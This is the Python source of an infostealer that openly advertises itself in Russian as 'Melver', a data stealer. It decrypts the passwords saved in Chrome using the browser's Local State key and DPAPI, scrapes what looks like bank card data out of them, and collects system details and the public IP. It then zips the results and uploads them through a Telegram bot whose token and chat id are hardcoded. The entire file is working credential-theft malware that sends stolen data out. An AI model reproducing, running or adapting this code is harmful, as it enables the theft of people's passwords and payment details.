import os
import zipfile
import requests
import sqlite3
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import json
import shutil
import re
import time

class BrowserPasswords:
    def __init__(self):
        self.chrome_passwords = []
        self.key = self.get_encryption_key()

    def get_encryption_key(self):
        local_app_data = os.getenv("LOCALAPPDATA")
        local_state_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Local State")
        try:
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state_data = json.load(file)
            encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Ошибка при получении ключа шифрования: {e}")
            return None

    def decrypt_chrome_password(self, encrypted_password):
        try:
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AESGCM(self.key)
            decrypted_password = cipher.decrypt(iv, encrypted_password, None)
            return decrypted_password.decode("utf-8")
        except Exception as e:
            print(f"Ошибка при дешифровке пароля из Chrome: {e}")
            return None

    def get_all_chrome_passwords(self):
        passwords = []
        local_app_data = os.getenv("LOCALAPPDATA")
        chrome_db_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Login Data")
        temp_db_path = "chrome_login_data_copy.db"
        try:
            shutil.copy2(chrome_db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                decrypted_password = self.decrypt_chrome_password(encrypted_password)
                if decrypted_password:
                    passwords.append(f"URL: {url}, Username: {username}, Password: {decrypted_password}")
            conn.close()
        except Exception as e:
            print(f"Ошибка при получении паролей из Chrome: {e}")
        finally:
            self.remove_temp_db(temp_db_path)

        return passwords

    def get_bank_card_data(self):
        local_app_data = os.getenv("LOCALAPPDATA")
        chrome_db_path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Login Data")
        temp_db_path = "chrome_login_data_copy.db"
        bank_card_data = None
        try:
            shutil.copy2(chrome_db_path, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                decrypted_password = self.decrypt_chrome_password(encrypted_password)
                if decrypted_password:
                    card_data = self.parse_bank_card_data(decrypted_password)
                    if card_data:
                        bank_card_data = card_data
                        break
            conn.close()
        except Exception as e:
            print(f"Ошибка при получении данных карты: {e}")
        finally:
            self.remove_temp_db(temp_db_path)

        return bank_card_data

    def remove_temp_db(self, temp_db_path):
        try:
            os.remove(temp_db_path)
        except PermissionError:
            print("Ошибка доступа к файлу, пытаемся повторить через 1 секунду.")
            time.sleep(1)
            try:
                os.remove(temp_db_path)
            except Exception as e:
                print(f"Не удалось удалить файл после повторной попытки: {e}")

    def parse_bank_card_data(self, decrypted_password):
        card_number = re.search(r'\d{13,16}', decrypted_password).group() if re.search(r'\d{13,16}', decrypted_password) else None
        expiration_date = re.search(r'\d{2}/\d{4}', decrypted_password).group() if re.search(r'\d{2}/\d{4}', decrypted_password) else None
        cvv = re.search(r'\d{3,4}', decrypted_password).group() if re.search(r'\d{3,4}', decrypted_password) else None
        return {'card_number': card_number, 'expiration_date': expiration_date, 'cvv': cvv}
    

import requests
import zipfile
import os
import psutil
import platform
import socket

class TelegramBot:
    def __init__(self, api_token, chat_id):
        self.api_token = api_token
        self.chat_id = chat_id

    def send_file_to_telegram(self, file_path):
        url = f"https://api.telegram.org/bot{self.api_token}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': self.chat_id}
        response = requests.post(url, files=files, data=data)
        files['document'].close()
        chat_id = "6539911219"

        # Используем rich для красивого вывода
        console = Console()
        if response.status_code == 200:
            # Стильный вывод сообщения об успешной отправке
            message = Text(f"Архив с данными пользователя успешно отправлен в чат с пользователем - {chat_id} ", style="bold green")
            message.append("\n\nMelver Project (v1.0) - Стиллер данных", style="bold yellow")
            message.append("\n\nПочему выбирают именно нас?", style="bold cyan")
            message.append("\n- Хорошее качество", style="italic magenta")
            message.append("\n- Взаимодействие с разными API системами", style="italic magenta")
            message.append("\n- Открытый исходный код на Github", style="italic magenta")
            message.append("\n\nАктуальная версия стиллера:", style="bold white")
            message.append("\n- https://github.com/twelwy22/Melver", style="italic green")
            message.append("\n\nИнформация:", style="bold red")
            message.append("\nMelver - это проект который стилит данные и отправляет результат архивом в ваш чат телеграмма", style="bold white")
            message.append("\n\nДанные, которые стилятся:", style="bold green")
            message.append("\n- IP", style="italic green")
            message.append("\n- Пароли", style="italic green")
            message.append("\n- Системный трей компьютера", style="italic green")
            message.append("\n- Полное автозаполнение браузеров", style="italic green")
            message.append("\n- Куки", style="italic green")
            message.append("\n\nРазработчик:", style="bold white")
            message.append("\n- Yoshiko", style="italic green")
            message.append("\n\nСоциальные сети:", style="bold white")
            message.append("\n- Discord: culturing", style="italic green")
            message.append("\n- Telegram: @autuming", style="italic green")
            console.print(message)
        else:
            console.print(f"Не удалось отправить файл: {response.text}", style="bold red")
    
    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json')
            if response.status_code == 200:
                return response.json().get('ip')
            else:
                print("Не удалось получить IP-адрес.")
                return None
        except Exception as e:
            print(f"Ошибка при получении IP: {e}")
            return None

    def get_system_info(self):
        try:
            system_info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "Architecture": platform.architecture(),
                "Processor": platform.processor(),
                "Machine": platform.machine(),
                "CPU Cores": psutil.cpu_count(logical=True),
                "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
                "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
                "IP Address": socket.gethostbyname(socket.gethostname())
            }
            return system_info
        except Exception as e:
            print(f"Ошибка при получении системной информации: {e}")
            return {}

    def create_zip_and_send(self, password_data, bank_card_data):
        # Получаем IP-адрес
        public_ip = self.get_public_ip()

        # Получаем системные данные
        system_info = self.get_system_info()

        # Сохраняем данные в файлы
        with open('password.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(password_data))

        with open('bank_card.txt', 'w', encoding='utf-8') as f:
            f.write(f"Card Number: {bank_card_data['card_number']}\nExpiration: {bank_card_data['expiration_date']}\nCVV: {bank_card_data['cvv']}")

        # Сохраняем системную информацию в файл
        with open('system_info.txt', 'w', encoding='utf-8') as f:
            for key, value in system_info.items():
                f.write(f"{key}: {value}\n")

        # Если IP-адрес получен, сохраняем его в ip.txt
        if public_ip:
            with open('ip.txt', 'w', encoding='utf-8') as f:
                f.write(f"IP Address: {public_ip}\n")

        # Архивируем файлы
        with zipfile.ZipFile('data.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write('password.txt')
            zipf.write('bank_card.txt')
            zipf.write('system_info.txt')
            if public_ip:
                zipf.write('ip.txt')

        # Отправляем архив в Telegram
        self.send_file_to_telegram('data.zip')

        # Удаляем временные файлы
        os.remove('password.txt')
        os.remove('bank_card.txt')
        os.remove('system_info.txt')
        if public_ip:
            os.remove('ip.txt')
        os.remove('data.zip')

from rich.console import Console
from rich.text import Text

def main():
    telegram_api_token = "7655224384:AAFbHy1MqF40TAdTY9WN4V53Z_6pfQuZk9U"
    chat_id = "6539911219"
    browser = BrowserPasswords()
    telegram = TelegramBot(telegram_api_token, chat_id)

    # Получаем данные
    passwords = browser.get_all_chrome_passwords()
    bank_card_data = browser.get_bank_card_data()

    # Отправляем данные в архиве
    telegram.create_zip_and_send(passwords, bank_card_data)

if __name__ == "__main__":
    main()
